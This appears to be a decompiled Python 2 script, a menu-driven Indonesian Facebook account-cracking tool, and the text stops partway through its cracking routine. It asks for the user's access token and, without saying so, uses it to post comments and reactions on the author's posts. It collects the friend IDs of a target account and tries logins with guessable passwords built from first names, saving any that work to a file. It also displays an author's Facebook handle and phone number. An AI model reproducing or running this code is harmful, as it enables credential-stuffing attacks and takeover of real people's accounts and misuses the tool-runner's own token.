# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2021-11-08 03:51:19.063572
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 KIYAY_.py')
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False
def animate():
    for c in itertools.cycle(['\x1b[1;91m|', '\x1b[1;97m/', '\x1b[1;91m-', '\x1b[1;97m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;97mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)
t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True
def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Keluar'
    os.sys.exit()
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    return cetak(d)
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))
    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
logo = logo = '\n\n\x1b[1;97m   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m   \xe2\x95\x91\x1b[1;91m    _   _ _   _ ___ ____ _______  __ \x1b[1;97m   \xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x91\x1b[1;91m   | | | | \\ | |_ _/ ___|___ /\\ \\/ /  \x1b[1;97m  \xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x91\x1b[1;91m   | | | |  \\| || |\\___ \\ |_ \\ \\  /   \x1b[1;97m  \xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x91\x1b[1;97m   | |_| | |\\  || | ___) |__) |/  \\    \x1b[1;97m \xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x91\x1b[1;97m    \\___/|_| \\_|___|____/____//_/\\_\\  \x1b[1;97m  \xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x91\x1b[1;97m                                      \x1b[0;97m  \xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \n\x1b[1;97m   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m   \xe2\x95\x91 \x1b[1;91m\xe2\x9c\xb0\x1b[1;97m Author   : ROMI AFRIZAL              \xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x91 \x1b[1;91m\xe2\x9c\xb0\x1b[1;97m Facebook : facebook.com/romi.rizal.58\xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x91 \x1b[1;91m\xe2\x9c\xb0\x1b[1;97m WhatsAp  : 08237164818\xc3\x97\x1b[1;97m              \xe2\x95\x91\n\x1b[1;97m   \xe2\x95\x91 \x1b[1;91m\xe2\x9c\xb0\x1b[1;97m Team     : RATU ERROR PROJECT\x1b[1;97m        \xe2\x95\x91\n \x1b[1;97m  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0;97m[\x1b[0;93m\xe2\x97\x8f\x1b[0;97m]\x1b[0;93m Sedang Masuk\x1b[0;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
fbid = []
idteman = []
idfromteman = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
def masuk():
    os.system('clear')
    print logo
    print '\x1b[0;97m   \xe2\x95\x94                                        \xe2\x95\x97'
    print '\x1b[0;97m     [\x1b[0;97m01\x1b[0;97m]\x1b[0;96m\x1b[0;97m Login Menggunakan Token Facebook'
    print '\x1b[0;97m     [\x1b[0;91m00\x1b[0;97m]\x1b[0;96m\x1b[0;97m Keluar'
    print '\x1b[0;97m   \xe2\x95\x9a                                        \xe2\x95\x9d'
    pilih_masuk()
def pilih_masuk():
    msuk = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m ')
    if msuk == '':
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Salah Sayang !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Salah Sayang !'
        pilih_masuk()
def tokenz():
    os.system('clear')
    print logo
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    toket = raw_input('\x1b[0;97m [\x1b[0;91m?\x1b[0;97m] Token \x1b[1;91m: \x1b[1;97m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\x1b[0;97m')
        jalan('\x1b[0;97m [\x1b[0;32m\xe2\x9c\x93\x1b[0;97m]\x1b[0;32m Berhasil Yay')
        os.system('xdg-open https://www.facebook.com/romi.rizal.58')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m [\x1b[1;91m!\x1b[1;97m] \x1b[1;97m Token Salah !'
        time.sleep(1.0)
        masuk()
def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
    kom = 'Gw Pake Sc Lu Bang \xf0\x9f\x98\x98'
    reac = 'LOVE'
    post = '213235326925325'
    post2 = '209016570680534'
    kom2 = 'Mantap Bang \xf0\x9f\x98\x81'
    reac2 = 'ANGRY'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()
def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Tidak ada koneksi'
        keluar()
    os.system('clear')
    print logo
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m Nama Akun\x1b[0;97m     :\x1b[0;97m ' + nama
    print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m User ID\x1b[0;97m       :\x1b[0;97m ' + id
    print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m Tanggal Lahir\x1b[0;97m :\x1b[0;97m ' + a['birthday']
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[0;97m [\x1b[0;97m01\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack ID Indonesia'
    print '\x1b[0;97m [\x1b[0;97m02\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack ID Bangladesh'
    print '\x1b[0;97m [\x1b[0;97m03\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack ID India'
    print '\x1b[0;97m [\x1b[0;97m04\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack ID Post'
    print '\x1b[0;97m [\x1b[0;97m05\x1b[0;97m]\x1b[0;97m\x1b[0;97m Dump ID'
    print '\x1b[0;97m [\x1b[0;97m06\x1b[0;97m]\x1b[0;97m\x1b[0;97m Lihat Hasil Crack'
    print '\x1b[0;97m [\x1b[0;97m07\x1b[0;97m]\x1b[0;97m\x1b[0;97m Cari Id Lewat Username'
    print '\x1b[0;97m [\x1b[0;97m08\x1b[0;97m]\x1b[0;97m\x1b[0;97m Ikuti Saya Di Facebook'
    print '\x1b[0;97m [\x1b[0;91m00\x1b[0;97m]\x1b[0;97m\x1b[0;97m Logout'
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    pilih()
def pilih():
    unikers = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m ')
    if unikers == '':
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
        pilih()
    elif unikers == '1' or unikers == '01':
        indo()
    elif unikers == '2' or unikers == '02':
        bangla()
    elif unikers == '3' or unikers == '03':
        hindi()
    elif unikers == '4' or unikers == '04':
        crack_likes()
    elif unikers == '5' or unikers == '05':
        dump()
    elif unikers == '6' or unikers == '06':
        hasil()
    elif unikers == '7' or unikers == '07':
        ambil_id()
    elif unikers == '8' or unikers == '08':
        saya()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Menghapus Token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
        pilih()
def indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[0;97m [\x1b[0;97m01\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack dari ID Publik / Teman'
    print '\x1b[0;97m [\x1b[0;97m02\x1b[0;97m]\x1b[0;97m\x1b[0;97m Crack dari File'
    print '\x1b[0;97m [\x1b[0;91m00\x1b[0;97m]\x1b[0;97m\x1b[0;97m Kembali'
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    pilih_indo()
def pilih_indo():
    global cekpoint
    global oks
    teak = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m]\x1b[0;97m ')
    if teak == '':
        print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
        pilih_indo()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
            idt = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] User ID Target : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Nama Akun      : ' + op['name']
            except KeyError:
                print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] ID Publik / Teman Tidak Ada !'
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
                indo()
            except requests.exceptions.ConnectionError:
                print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] Tidak ada koneksi !'
                keluar()
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            try:
                print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
                idlist = raw_input('\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Nama File Target : ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print "\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] File tidak ada ! '"
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
            except IOError:
                print "\x1b[0;97m [\x1b[0;91m!\x1b[0;97m] File tidak ada !'"
                raw_input('\n\x1b[0;97m [\x1b[0;91m Back \x1b[0;97m]')
                indo()
        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[0;97m [\x1b[0;91m!\x1b[0;97m]\x1b[0;97m Isi Yg Benar !'
            pilih_indo()
        print '\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Total ID       : ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m [\x1b[0;91m\xe2\x80\xa2\x1b[0;97m\xe2\x80\xa2\x1b[0;97m] Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)
    print '\n\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '\x1b[1;97m \x1b[1;41;97mUNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM !\x1b[0m'
    print '\x1b[1;97m \x1b[1;41;97mTIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK !\x1b[0m'
    print '\x1b[0;97m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[0;97m%H:%M:%S')))
        sys.stdout.flush()
        em = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
            v = json.loads(an.text)
            pw = v['first_name'] + '123'
            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'})
            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw
                oke = open('done/indo.txt', 'a')
                oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw)
                oke.close()
                oks.append(em)
            elif 'checkpoint' in xo:
                print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw
                cek = open('done/indo.txt', 'a')
                cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw)
                cek.close()
                cekpoint.append(em)
            else:
                pw2 = v['first_name'] + '12345'
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36'})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw2)
                    oke.close()
                    oks.append(em)
                elif 'checkpoint' in xo:
                    print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw2)
                    cek.close()
                    cekpoint.append(em)
                else:
                    pw3 = v['first_name'] + '1234'
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36'})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw3)
                        oke.close()
                        oks.append(em)
                    elif 'checkpoint' in xo:
                        print '\x1b[0;93m [CP]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2>\x1b[0;97m ' + pw3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[CP] ' + em + ' <\xe2\x80\xa2> ' + pw3)
                        cek.close()
                        cekpoint.append(em)
                    else:
                        pw4 = 'Sayang'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;92m [OK]\x1b[0;97m ' + em + ' \x1b[0;91m<\xe2\x80\xa2> \x1b[0;97m' + pw4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[OK] ' + em + ' <\xe2\x80\xa2> ' + pw4)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
